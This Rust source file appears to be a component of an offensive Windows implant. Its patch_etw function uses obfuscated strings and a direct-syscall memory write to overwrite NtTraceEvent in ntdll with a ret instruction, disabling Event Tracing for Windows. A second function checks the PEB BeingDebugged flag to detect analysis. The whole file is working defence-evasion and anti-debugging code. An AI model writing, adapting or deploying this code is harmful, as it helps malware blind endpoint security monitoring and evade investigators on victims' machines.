use crate::nt_api::*;
use crate::parse_pe::*;
use anyhow::Ok;
use winapi::shared::ntdef::HANDLE;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::winnt::{TOKEN_INFORMATION_CLASS, TOKEN_QUERY};
use std::ffi::c_void;
use std::ptr::null;
use std::ptr::null_mut;
use crate::{debug_eprintln, debug_println};
use ntapi::ntpebteb::PEB;
use std::arch::asm;
use obfuse::obfuse;

pub fn patch_etw() -> Result<(), anyhow::Error>
{
    let obfused_ntdll = obfuse!("ntdll.dll");
    let ntdll_str = obfused_ntdll.as_str();

    let obfused_nt_trace_event = obfuse!("NtTraceEvent");
    let nt_trace_event_str = obfused_nt_trace_event.as_str();

    // exports.add(ntdll_str, nt_trace_event_str).expect("[ERROR] Finding address of NTTE.");

    // let nt_trace_addr = exports.get_function_address(nt_trace_event_str).expect("[ERROR] Unable to retrieve address of NTTE.") as * const c_void;
    
    let ntdll_ptr = unsafe { get_module_handle(ntdll_str) };
    let parser = PeModuleParser::new(ntdll_ptr);
    let Some(nt_trace_addr) = parser.get_func_addr(nt_trace_event_str) else { anyhow::bail!("[ERROR] Failed to find address of NTTE. ")};

    let handle = unsafe {
        GetCurrentProcess()
    };

    let ret_opcode: u8 = 0xC3; // ret
    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let res = unsafe {

        zw_write_virtual_memory(
            handle,
            nt_trace_addr as *mut c_void,
            &ret_opcode as *const u8 as *mut c_void,
            size,
            &mut bytes_written as *mut usize,
            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].ssn,
            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].syscall_ret
        )
    };

    if res != STATUS_SUCCESS || bytes_written != size {
        debug_eprintln!("[ERROR] Failed to patch ETW: 0x{:X}.", res);
    } else {
        debug_println!("[INFO] Successfully patched ETW.");
    }

    Ok(())

}

pub unsafe fn being_debugged_by_peb() -> bool {
    let peb_ptr: *mut PEB;
    unsafe {
        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);
    }

    if peb_ptr.is_null() {
        debug_eprintln!("[ERROR] Failed to retrieve PEB pointer.");
        return false;
    }

    let being_debugged = unsafe { (*peb_ptr).BeingDebugged };

    return being_debugged != 0;
}
